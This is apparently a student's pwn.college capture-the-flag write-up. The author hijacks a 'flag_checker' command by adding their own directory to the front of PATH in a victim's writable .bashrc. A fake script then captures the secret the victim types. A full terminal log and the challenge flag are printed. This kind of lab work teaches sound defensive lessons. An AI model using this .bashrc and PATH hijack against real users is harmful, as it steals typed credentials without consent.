# Silly Shenanigins

## Sniffing Input
This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named flag_checker, manually typing the flag into it for verification.

### Objective 
Your mission is to use your continued write access to Zardus's .bashrc to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the flag_checker?

### Solve
**Flag:** `pwn.college{4B8Senc9FUQ9I_P4pydUPsa5oPr.QX1MTM3EDLygjN0czW}`

- First I made the flag_checker script to read the flag and then display it.
- Then I changed the directory to /home/zardus and modified its .bashrc startup script to add /home/hacker to the beginninge of its path and display the path to the flag_checker command.
- Then I ran the `/challenge/victim` command. But I didn't get the flag as the command did not take the /home/hacker as the path to the flag_checker command and instead ran the usual flag_checker command.
- Now I got stuck here for a while as I couldn't figure out why it wasn't running my command. At the end I finally checked the permissions of the flag_checker file in the hacker home directory. There the executable permissions were not provided and that was what was causing the issue. 
- I added the executable permission and then again ran the `/challenge/victim` command. This time around, it ran as I wanted and I got the flag.

```bash
hacker@shenanigans~sniffing-input:~$ touch flag_checker
hacker@shenanigans~sniffing-input:~$ nano flag_checker
hacker@shenanigans~sniffing-input:~$ cat flag_checker
#!/bin/bash

echo "Type the flag :"
read flag
echo "Flag : $flag"
echo "Thanks for the flag"
hacker@shenanigans~sniffing-input:~$ cd /home/zardus
hacker@shenanigans~sniffing-input:/home/zardus$ nano ./.bashrc
hacker@shenanigans~sniffing-input:/home/zardus$ /challenge/victim
Username: zardus
Password: *******
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag, victim: ************************************************************
Correct!
zardus@shenanigans~sniffing-input:~$ exit
logout
hacker@shenanigans~sniffing-input:/home/zardus$ cd
hacker@shenanigans~sniffing-input:~$ ls
Desktop  bin  flag  flag_checker  home-backup.tar.gz  rm
hacker@shenanigans~sniffing-input:~$ nano flag_checker
hacker@shenanigans~sniffing-input:~$ which flag_checker
/run/challenge/bin/flag_checker
hacker@shenanigans~sniffing-input:~$ cd /home/zardus
hacker@shenanigans~sniffing-input:/home/zardus$ touch flag_checker
touch: cannot touch 'flag_checker': Permission denied
hacker@shenanigans~sniffing-input:/home/zardus$ which cat
/run/dojo/bin/cat
hacker@shenanigans~sniffing-input:/home/zardus$ export PATH="/home/hacker:/r
un/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/b
in:/sbin:/bin"
hacker@shenanigans~sniffing-input:/home/zardus$ which flag_checker
which: no flag_checker in (/home/hacker:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin)
hacker@shenanigans~sniffing-input:/home/zardus$ cd
hacker@shenanigans~sniffing-input:/home/zardus$ cd
hacker@shenanigans~sniffing-input:~$ ls -l flag_checker
-rw-r--r-- 1 hacker hacker 100 Sep 28 07:57 flag_checker
hacker@shenanigans~sniffing-input:~$ chmod a+x flag_checker
hacker@shenanigans~sniffing-input:~$ ls -l flag_checker
-rwxr-xr-x 1 hacker hacker 100 Sep 28 07:57 flag_checker
hacker@shenanigans~sniffing-input:~$ which flag_checker
which: no flag_checker in (/home/hacker/flag_checker:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin)
hacker@shenanigans~sniffing-input:~$ cd /home/zardus
hacker@shenanigans~sniffing-input:/home/zardus$ nano ./.bashrc
hacker@shenanigans~sniffing-input:/home/zardus$ /challenge/victim
Username: zardus
Password: *******
/home/hacker:/run/challenge/bin:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
/home/hacker/flag_checker
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag, victim:
************************************************************Flag : pwn.college{4B8Senc9FUQ9I_P4pydUPsa5oPr.QX1MTM3EDLygjN0czW}
Thanks for the flag
zardus@shenanigans~sniffing-input:~$ exit
logout
```

### New Learnings
1. .bashrc can be modified easily and can be used to run commands without the user knowing. In this way, sensitive info can be found without anyone suspecting. So it is a security issue.